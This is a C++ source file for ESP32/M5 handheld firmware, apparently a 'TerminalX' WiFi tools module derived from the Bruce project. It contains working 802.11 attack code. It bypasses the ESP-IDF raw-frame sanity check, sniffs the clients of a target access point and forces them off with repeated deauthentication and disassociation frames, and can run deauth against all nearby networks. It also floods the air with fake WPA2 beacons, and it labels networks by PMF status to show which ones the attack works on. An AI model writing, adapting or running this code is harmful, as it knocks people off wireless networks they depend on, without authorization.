#include "wifitools.h"
#include "board.h"
#include "ui.h"
#include "config.h"

#include <WiFi.h>
extern "C" {
#include "esp_wifi.h"
}

// ---------------------------------------------------------------------------
// Raw 802.11 injection engine, borrowed from Bruce (Bruce-A-C-Edition) and
// wrapped in TerminalX's own UI. The ESP-IDF WiFi driver refuses to transmit
// hand-built management frames (beacon/deauth) unless this sanity check is
// short-circuited. Overriding it here + -Wl,--allow-multiple-definition in
// platformio.ini makes the linker pick our version over the ROM/lib one.
// ---------------------------------------------------------------------------
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// ---- Scan storage ---------------------------------------------------------
#define MAX_NET 32

// pmf: deauth-vulnerability from the AP's PMF (802.11w) state.
enum { PMF_UNKNOWN = 0, PMF_NONE = 1, PMF_OPTIONAL = 2, PMF_REQUIRED = 3 };

struct NetInfo {
    char    ssid[33];
    uint8_t bssid[6];
    int32_t rssi;
    uint8_t ch;
    bool    open;
    uint8_t pmf;        // PMF_* : NONE=deauth works, REQUIRED=protected
};

static NetInfo g_nets[MAX_NET];
static int     g_netCount = 0;

// Menu-item pointers for the dynamic scan list (point straight at the SSIDs;
// no byte-level truncation, which would cut multibyte UTF-8 / Cyrillic mid-char).
static const char *g_linePtr[MAX_NET];
static uint8_t     g_bars[MAX_NET];     // per-network signal level (0..4) for the icon
static uint16_t    g_colors[MAX_NET];   // per-network text color by deauth-vulnerability

static uint8_t rssi_bars(int32_t rssi) {
    if (rssi >= -55) return 4;
    if (rssi >= -65) return 3;
    if (rssi >= -72) return 2;
    if (rssi >= -80) return 1;
    return 0;
}

// Deauth-vulnerability -> row color / word.
static uint16_t pmf_color(uint8_t pmf) {
    switch (pmf) {
        case PMF_NONE:     return COL_ACCENT;   // green: deauth works
        case PMF_OPTIONAL: return COL_WARN;     // orange: PMF optional
        case PMF_REQUIRED: return COL_DIM;      // gray: protected
        default:           return COL_FG;       // white: unknown
    }
}
static const char *pmf_word(uint8_t pmf) {
    switch (pmf) {
        case PMF_NONE:     return "WORKS";
        case PMF_OPTIONAL: return "opt-PMF";
        case PMF_REQUIRED: return "PROTECTED";
        default:           return "?";
    }
}

// ---- Frame templates ------------------------------------------------------
// 26-byte deauthentication frame (Bruce deauth_frame_default). Runtime fills
// the AP MAC at offsets 10 (source) and 16 (BSSID); dst stays broadcast.
static const uint8_t DEAUTH_TMPL[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // dst: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // src: AP BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID: AP
    0xf0, 0xff,                           // seq
    0x02, 0x00                            // reason: prev auth no longer valid
};

// ---- Targeted deauth --------------------------------------------------------
// Broadcast deauth is ignored by most modern clients, so we run promiscuous on
// the target's channel, learn the MACs of stations talking to its BSSID, and
// hit each one with unicast deauth + disassoc (both directions). This is what
// actually kicks devices off WPA/WPA2 networks (no 802.11w/PMF).
static uint8_t          g_targetBssid[6];
static uint8_t          g_clients[16][6];
static volatile uint8_t g_clientCount = 0;

static inline bool is_mcast(const uint8_t *m) { return m[0] & 0x01; }

static void sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *pl = p->payload;
    const uint8_t *a1 = pl + 4;      // addr1 (RA/DA)
    const uint8_t *a2 = pl + 10;     // addr2 (TA/SA)
    const uint8_t *cli = nullptr;
    if (memcmp(a1, g_targetBssid, 6) == 0 && !is_mcast(a2)) cli = a2;
    else if (memcmp(a2, g_targetBssid, 6) == 0 && !is_mcast(a1)) cli = a1;
    if (!cli || memcmp(cli, g_targetBssid, 6) == 0) return;
    for (int i = 0; i < g_clientCount; i++)
        if (memcmp(g_clients[i], cli, 6) == 0) return;
    if (g_clientCount < 16) { memcpy(g_clients[g_clientCount], cli, 6); g_clientCount++; }
}

// Send deauth + disassoc for one (dst,src,bssid) triple on the STA interface,
// cycling reason codes (some client drivers only honour specific ones).
static void kick(const uint8_t *dst, const uint8_t *src, const uint8_t *bssid) {
    static const uint8_t reasons[] = {1, 2, 4, 7};
    static uint8_t ri = 0;
    uint8_t f[26];
    memcpy(f, DEAUTH_TMPL, sizeof(f));
    memcpy(f + 4, dst, 6);
    memcpy(f + 10, src, 6);
    memcpy(f + 16, bssid, 6);
    f[24] = reasons[ri]; f[25] = 0x00;
    ri = (ri + 1) & 3;
    f[0] = 0xC0; esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);   // deauth
    f[0] = 0xA0; esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);   // disassoc
}

// ---- PMF (deauth-vulnerability) detection ----------------------------------
// Sniff each AP's beacon, parse its RSN Information Element and read the RSN
// Capabilities MFPR/MFPC bits: MFPR=1 -> PMF required (deauth blocked), MFPC-only
// -> optional, no RSN/MFP -> deauth works. Sets NetInfo.pmf.
static int find_ap(const uint8_t *bssid) {
    for (int i = 0; i < g_netCount; i++)
        if (memcmp(g_nets[i].bssid, bssid, 6) == 0) return i;
    return -1;
}

static void pmf_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *fr = p->payload;
    uint8_t sub = fr[0] & 0xF0;                    // subtype: beacon 0x80, probe-resp 0x50
    if (sub != 0x80 && sub != 0x50) return;
    int idx = find_ap(fr + 16);                    // addr3 = BSSID
    if (idx < 0 || g_nets[idx].pmf != PMF_UNKNOWN) return;

    int total = p->rx_ctrl.sig_len;
    const uint8_t *end = fr + total - 4;           // minus FCS
    const uint8_t *ie = fr + 36;                   // skip 24B header + 12B fixed params
    uint8_t pmf = PMF_NONE;                         // no RSN found => no PMF
    while (ie + 2 <= end) {
        uint8_t tag = ie[0], l = ie[1];
        if (ie + 2 + l > end) break;
        if (tag == 48 && l >= 8) {                 // RSN IE
            const uint8_t *r = ie + 2, *re = ie + 2 + l;
            r += 2 + 4;                            // version + group cipher
            if (r + 2 > re) break;
            uint16_t pc = r[0] | (r[1] << 8); r += 2 + 4 * pc;     // pairwise
            if (r + 2 > re) break;
            uint16_t ac = r[0] | (r[1] << 8); r += 2 + 4 * ac;     // AKM
            if (r + 2 <= re) {
                uint8_t caps = r[0];
                pmf = (caps & 0x40) ? PMF_REQUIRED : (caps & 0x80) ? PMF_OPTIONAL : PMF_NONE;
            }
            break;
        }
        ie += 2 + l;
    }
    g_nets[idx].pmf = pmf;
}

// Funny SSID list for beacon spam.
static const char *const FUNNY_SSIDS[] = {
    "FBI Surveillance Van",  "Free Public WiFi",     "Pretty Fly for a WiFi",
    "Loading...",            "Mom Use This One",     "The Promised LAN",
    "Bill Wi the Science Fi","Drop It Like Its Hotspot", "Winternet Is Coming",
    "LAN Solo",              "Wu-Tang LAN",          "Silence of the LANs",
    "Get Off My LAN",        "It Hurts When IP",     "Hide Yo Kids Hide Yo WiFi",
    "Nacho WiFi",            "Definitely Not a Trap","Router? I Hardly Know Her",
};
static const int FUNNY_COUNT = sizeof(FUNNY_SSIDS) / sizeof(FUNNY_SSIDS[0]);

// Realistic-looking prefixes for the random-SSID mode.
static const char *const RAND_PREFIX[] = {
    "TP-LINK_", "AndroidAP_", "NETGEAR", "Xfinity-", "iPhone_",
    "Guest_",   "dlink-",     "ASUS_",   "FREEWiFi_", "Home-",
};
static const int RAND_PREFIX_COUNT = sizeof(RAND_PREFIX) / sizeof(RAND_PREFIX[0]);

// ---- Local settings (WiFi "Config"; RAM only, reset on reboot) ------------
static struct {
    bool showHidden = false;   // list hidden (no-SSID) networks in Scan
} g_cfg;

// ---- Radio lifecycle ------------------------------------------------------
static void wifi_attack_begin(uint8_t ch) {
    WiFi.mode(WIFI_MODE_APSTA);        // both interfaces up (Bruce injection setup)
    delay(80);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void wifi_off() {
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
}

// Random locally-administered unicast MAC.
static void gen_mac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) mac[i] = esp_random() & 0xFF;
    mac[0] = (mac[0] & 0xFC) | 0x02;   // unicast + locally administered
}

// ---- Beacon frame builder --------------------------------------------------
// Builds a realistic WPA2-PSK beacon into buf; returns the frame length.
// A stable per-AP BSSID + incrementing sequence number is what makes clients
// (incl. macOS) list each fake network as a distinct, persistent AP instead of
// merging/dropping the flapping noise a per-frame-random MAC produces.
static int build_beacon(uint8_t *buf, const uint8_t *bssid, const char *ssid,
                        uint8_t ssidLen, uint8_t channel, uint16_t seq) {
    if (ssidLen > 32) ssidLen = 32;
    int i = 0;

    buf[i++] = 0x80; buf[i++] = 0x00;                    // FC: beacon
    buf[i++] = 0x00; buf[i++] = 0x00;                    // duration
    for (int k = 0; k < 6; k++) buf[i++] = 0xFF;         // DA: broadcast
    memcpy(buf + i, bssid, 6); i += 6;                   // SA
    memcpy(buf + i, bssid, 6); i += 6;                   // BSSID
    buf[i++] = (seq << 4) & 0xFF;                        // seq ctrl (frag 0)
    buf[i++] = (seq >> 4) & 0xFF;
    for (int k = 0; k < 8; k++) buf[i++] = 0x00;         // timestamp
    buf[i++] = 0x64; buf[i++] = 0x00;                    // beacon interval (100 TU)
    buf[i++] = 0x11; buf[i++] = 0x00;                    // capability: ESS + Privacy

    buf[i++] = 0x00; buf[i++] = ssidLen;                 // SSID IE
    memcpy(buf + i, ssid, ssidLen); i += ssidLen;

    buf[i++] = 0x01; buf[i++] = 0x08;                    // supported rates
    buf[i++] = 0x82; buf[i++] = 0x84; buf[i++] = 0x8b; buf[i++] = 0x96;
    buf[i++] = 0x24; buf[i++] = 0x30; buf[i++] = 0x48; buf[i++] = 0x6c;

    buf[i++] = 0x03; buf[i++] = 0x01; buf[i++] = channel;                 // DS param

    buf[i++] = 0x32; buf[i++] = 0x04;                    // extended rates
    buf[i++] = 0x0c; buf[i++] = 0x12; buf[i++] = 0x18; buf[i++] = 0x60;

    buf[i++] = 0x30; buf[i++] = 0x14;                    // RSN (WPA2-PSK, CCMP)
    buf[i++] = 0x01; buf[i++] = 0x00;                    // version
    buf[i++] = 0x00; buf[i++] = 0x0f; buf[i++] = 0xac; buf[i++] = 0x04;   // group: CCMP
    buf[i++] = 0x01; buf[i++] = 0x00;                    // pairwise count
    buf[i++] = 0x00; buf[i++] = 0x0f; buf[i++] = 0xac; buf[i++] = 0x04;   // pairwise: CCMP
    buf[i++] = 0x01; buf[i++] = 0x00;                    // AKM count
    buf[i++] = 0x00; buf[i++] = 0x0f; buf[i++] = 0xac; buf[i++] = 0x02;   // AKM: PSK
    buf[i++] = 0x00; buf[i++] = 0x00;                    // RSN capabilities

    return i;
}

static uint8_t make_random_ssid(char *out) {
    const char *pfx = RAND_PREFIX[esp_random() % RAND_PREFIX_COUNT];
    int n = snprintf(out, 33, "%s%04X", pfx, (unsigned)(esp_random() & 0xFFFF));
    if (n > 32) n = 32;
    return (uint8_t)n;
}

// ===========================================================================
//  Scan / Analyze
// ===========================================================================
static void do_scan() {
    ui_message("WiFi Scan", "Scanning...", "please wait");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, true);
    delay(100);

    int n = WiFi.scanNetworks(false /*sync*/, true /*show hidden*/);
    g_netCount = 0;
    for (int i = 0; i < n && g_netCount < MAX_NET; i++) {
        NetInfo &e = g_nets[g_netCount];
        String s = WiFi.SSID(i);
        bool hidden = (s.length() == 0);
        if (hidden && !g_cfg.showHidden) continue;   // Settings: hide hidden nets
        if (hidden) s = "<hidden>";
        strncpy(e.ssid, s.c_str(), 32);
        e.ssid[32] = 0;
        memcpy(e.bssid, WiFi.BSSID(i), 6);
        e.rssi = WiFi.RSSI(i);
        e.ch   = (uint8_t)WiFi.channel(i);
        wifi_auth_mode_t am = WiFi.encryptionType(i);
        e.open = (am == WIFI_AUTH_OPEN);
        // Seed PMF from auth mode; WPA2 needs the RSN sniff below to be sure.
        if (am == WIFI_AUTH_OPEN || am == WIFI_AUTH_WEP || am == WIFI_AUTH_WPA_PSK)
            e.pmf = PMF_NONE;
        else if (am == WIFI_AUTH_WPA3_PSK)
            e.pmf = PMF_REQUIRED;
        else if (am == WIFI_AUTH_WPA2_WPA3_PSK)
            e.pmf = PMF_OPTIONAL;
        else
            e.pmf = PMF_UNKNOWN;                      // WPA2 & co -> confirm via RSN
        g_netCount++;
    }
    WiFi.scanDelete();

    // Refine PMF: sniff beacons on the channels that still have unknowns and
    // read the RSN Capabilities MFPR/MFPC bits.
    bool visit[14] = {false};
    bool any = false;
    for (int i = 0; i < g_netCount; i++)
        if (g_nets[i].pmf == PMF_UNKNOWN && g_nets[i].ch >= 1 && g_nets[i].ch <= 13) {
            visit[g_nets[i].ch] = true; any = true;
        }
    if (any) {
        ui_message("WiFi Scan", "Checking PMF...", "deauth vuln");
        wifi_promiscuous_filter_t filt;
        filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous_rx_cb(&pmf_cb);
        esp_wifi_set_promiscuous(true);
        for (int ch = 1; ch <= 13; ch++) {
            if (!visit[ch]) continue;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            delay(300);                              // dwell: pmf_cb fills RSN caps
        }
        esp_wifi_set_promiscuous(false);
    }
    WiFi.mode(WIFI_OFF);
}

// Kick a single AP: sniff its associated clients and unicast-deauth them
// (plus a broadcast for legacy clients) until stopped.
static void run_deauth_ap(const NetInfo &ap) {
    WiFi.mode(WIFI_STA);
    delay(80);
    memcpy(g_targetBssid, ap.bssid, 6);
    g_clientCount = 0;
    esp_wifi_set_channel(ap.ch, WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_filter_t filt;
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniff_cb);
    esp_wifi_set_promiscuous(true);

    M5.Display.fillScreen(COL_BG);
    ui_hint("M5 = stop    hold side = exit");

    const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint32_t sent = 0, lastDraw = 0;
    board_update();
    while (true) {
        board_update();
        if (nav_long || ok_click) break;

        kick(bcast, ap.bssid, ap.bssid); sent += 2;          // broadcast (legacy)
        uint8_t nc = g_clientCount;
        for (int i = 0; i < nc; i++) {
            kick(g_clients[i], ap.bssid, ap.bssid); sent += 2;    // AP -> client
            kick(ap.bssid, g_clients[i], ap.bssid); sent += 2;    // client -> AP
        }
        delay(1);

        if (millis() - lastDraw > 200) {
            lastDraw = millis();
            Serial.printf("[deauth] %s ch%d clients=%u tx=%lu\n",
                          ap.ssid, ap.ch, nc, (unsigned long)sent);
            char l2[24];
            snprintf(l2, sizeof(l2), "cl %u   tx %lu", nc, (unsigned long)sent);
            ui_live("Deauth", ap.ssid, l2);
        }
    }
    esp_wifi_set_promiscuous(false);
    wifi_off();
}

// Detail + action screen for one scanned network.
static void net_detail(const NetInfo &e) {
    char l2[40];
    snprintf(l2, sizeof(l2), "ch%d  %lddB   M5=deauth  hold=back",
             e.ch, (long)e.rssi);
    ui_message(e.ssid, "", l2);
    // Colored deauth verdict on the big line.
    M5.Display.setFont(&fonts::efontJA_16);
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(pmf_color(e.pmf), COL_BG);
    M5.Display.setCursor(8, 52);
    M5.Display.printf("deauth: %s", pmf_word(e.pmf));

    board_update();
    while (true) {
        board_update();
        if (ok_click) { run_deauth_ap(e); return; }
        if (nav_long) return;
        delay(8);
    }
}

static void screen_scan() {
    do_scan();
    if (g_netCount == 0) {
        ui_message("WiFi Scan", "No networks", "hold=back");
        ui_wait_any();
        return;
    }

    while (true) {
        // SSID + signal icon; row color flags deauth-vulnerability (green=works,
        // gray=PMF-protected). Channel/RSSI/BSSID appear on the AP detail.
        for (int i = 0; i < g_netCount; i++) {
            g_linePtr[i] = g_nets[i].ssid;
            g_bars[i]    = rssi_bars(g_nets[i].rssi);
            g_colors[i]  = pmf_color(g_nets[i].pmf);
        }
        int c = ui_menu("Networks", g_linePtr, g_netCount, 0, g_bars, g_colors);
        if (c < 0) return;
        net_detail(g_nets[c]);
    }
}

// ===========================================================================
//  Beacon Spam
// ===========================================================================
#define SPAM_MAX 48

// A persistent fake AP: fixed SSID + fixed BSSID + its own rolling sequence.
struct FakeAP {
    char     ssid[33];
    uint8_t  len;
    uint8_t  bssid[6];
    uint16_t seq;
};
static FakeAP g_ap[SPAM_MAX];

// Build the set of fake APs once (stable SSIDs + BSSIDs for the whole run).
static int build_ap_set(bool funny) {
    int n = funny ? FUNNY_COUNT : 40;
    if (n > SPAM_MAX) n = SPAM_MAX;
    for (int i = 0; i < n; i++) {
        FakeAP &a = g_ap[i];
        if (funny) {
            strncpy(a.ssid, FUNNY_SSIDS[i], 32);
            a.ssid[32] = 0;
            a.len = (uint8_t)strlen(a.ssid);
        } else {
            a.len = make_random_ssid(a.ssid);
        }
        gen_mac(a.bssid);              // stable BSSID for this AP
        a.seq = esp_random() & 0x0FFF;
    }
    return n;
}

static void run_beacon_spam(bool funny) {
    wifi_attack_begin(1);
    M5.Display.fillScreen(COL_BG);
    ui_hint("M5 = stop    hold side = exit");

    int n = build_ap_set(funny);
    // Popular non-overlapping channels first, then the rest — most clients park
    // on 1/6/11, so those get beaconed most often.
    static const uint8_t chans[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
    const int nCh = sizeof(chans) / sizeof(chans[0]);

    uint8_t buf[160];
    uint32_t sent = 0, err = 0, lastDraw = 0;
    int ci = 0;
    uint8_t ch = chans[0];
    bool stop = false;

    board_update();
    while (!stop) {
        // One full pass = every AP beaconed once on the current channel, PACED
        // (vTaskDelay after each frame) so the small WiFi TX queue never
        // overflows and drops frames — this is why only ~1 AP showed before.
        for (int i = 0; i < n && !stop; i++) {
            int len = build_beacon(buf, g_ap[i].bssid, g_ap[i].ssid,
                                   g_ap[i].len, ch, g_ap[i].seq++);
            for (int k = 0; k < 2; k++) {
                if (esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false) == ESP_OK) sent++;
                else err++;
            }
            delay(1);                       // let the TX queue drain
            if ((i & 7) == 0) {             // stay responsive to stop
                board_update();
                if (nav_long || ok_click) stop = true;
            }
        }

        // Hop to the next channel once the whole list has beaconed.
        ci = (ci + 1) % nCh;
        ch = chans[ci];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

        board_update();
        if (nav_long || ok_click) stop = true;
        if (millis() - lastDraw > 250) {
            lastDraw = millis();
            Serial.printf("[beacon] %d APs ch%d ok=%lu err=%lu\n",
                          n, ch, (unsigned long)sent, (unsigned long)err);
            char l1[24], l2[24];
            snprintf(l1, sizeof(l1), "%d APs  ch%d", n, ch);
            snprintf(l2, sizeof(l2), "%s  %lu tx", funny ? "funny" : "random",
                     (unsigned long)sent);
            ui_live("Beacon Spam", l1, l2);
        }
    }
    wifi_off();
}

static void screen_beacon() {
    while (true) {                       // own loop: stop returns here, not two levels up
        const char *items[] = {"Random SSIDs", "Funny SSIDs"};
        int c = ui_menu("Beacon Spam", items, 2);
        if (c < 0) return;
        run_beacon_spam(c == 1);
    }
}

// ===========================================================================
//  Deauth
// ===========================================================================
// Rescan, then continuously deauth every AP found, hopping to each channel.
static void run_deauth_all() {
    do_scan();
    if (g_netCount == 0) {
        ui_message("Deauth All", "No networks", "hold=back");
        ui_wait_any();
        return;
    }

    WiFi.mode(WIFI_MODE_APSTA);
    delay(80);
    M5.Display.fillScreen(COL_BG);
    ui_hint("M5 = stop    hold side = exit");

    uint8_t frame[26];
    uint32_t sent = 0, err = 0, lastDraw = 0;
    board_update();
    while (true) {
        for (int i = 0; i < g_netCount; i++) {
            board_update();
            if (nav_long || ok_click) { wifi_off(); return; }

            esp_wifi_set_channel(g_nets[i].ch, WIFI_SECOND_CHAN_NONE);
            memcpy(frame, DEAUTH_TMPL, sizeof(frame));
            memcpy(frame + 10, g_nets[i].bssid, 6);
            memcpy(frame + 16, g_nets[i].bssid, 6);
            for (int r = 0; r < 4; r++) {
                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK) sent++;
                else err++;
            }

            if (millis() - lastDraw > 200) {
                lastDraw = millis();
                Serial.printf("[deauth-all] nets=%d ok=%lu err=%lu\n",
                              g_netCount, (unsigned long)sent, (unsigned long)err);
                char l1[16], l2[24];
                snprintf(l1, sizeof(l1), "nets %d", g_netCount);
                snprintf(l2, sizeof(l2), "pkts %lu", (unsigned long)sent);
                ui_live("Deauth All", l1, l2);
            }
            delay(1);
        }
    }
}

// Scan, list APs, and run `action` on the one picked. Loops so stopping the
// attack returns to the AP list (one level), not out of Deauth entirely.
static void pick_target_and(void (*action)(const NetInfo &)) {
    do_scan();
    if (g_netCount == 0) {
        ui_message("Deauth", "No networks", "hold=back");
        ui_wait_any();
        return;
    }
    while (true) {
        for (int i = 0; i < g_netCount; i++) {
            g_linePtr[i] = g_nets[i].ssid;
            g_bars[i]    = rssi_bars(g_nets[i].rssi);
            g_colors[i]  = pmf_color(g_nets[i].pmf);   // green=deauth works, gray=PMF
        }
        int c = ui_menu("Pick AP", g_linePtr, g_netCount, 0, g_bars, g_colors);
        if (c < 0) return;
        action(g_nets[c]);
    }
}

static void screen_deauth() {
    while (true) {                       // own loop: stop returns here, not two levels up
        const char *items[] = {"Target (sniff)", "Deauth all APs"};
        int c = ui_menu("Deauth", items, 2);
        if (c < 0) return;
        if (c == 0) pick_target_and(run_deauth_ap);   // sniff clients -> unicast kick
        else if (c == 1) run_deauth_all();            // broadcast every AP, hop channels
    }
}

// ===========================================================================
//  Config (local settings for WiFi)
// ===========================================================================
static void screen_config() {
    while (true) {
        char a[24];
        snprintf(a, sizeof(a), "Hidden nets: %s", g_cfg.showHidden ? "Show" : "Hide");
        const char *items[] = {a};
        int c = ui_menu("WiFi Config", items, 1);
        if (c < 0) return;
        if (c == 0) g_cfg.showHidden = !g_cfg.showHidden;
    }
}

// ===========================================================================
//  Entry point
// ===========================================================================
void wifitools_menu() {
    while (true) {
        const char *items[] = {"Scan / Analyze", "Beacon Spam", "Deauth", "Config"};
        int c = ui_menu("WiFi", items, 4);
        if (c < 0) { wifi_off(); return; }
        if (c == 0) screen_scan();
        else if (c == 1) screen_beacon();
        else if (c == 2) screen_deauth();
        else if (c == 3) screen_config();
    }
}
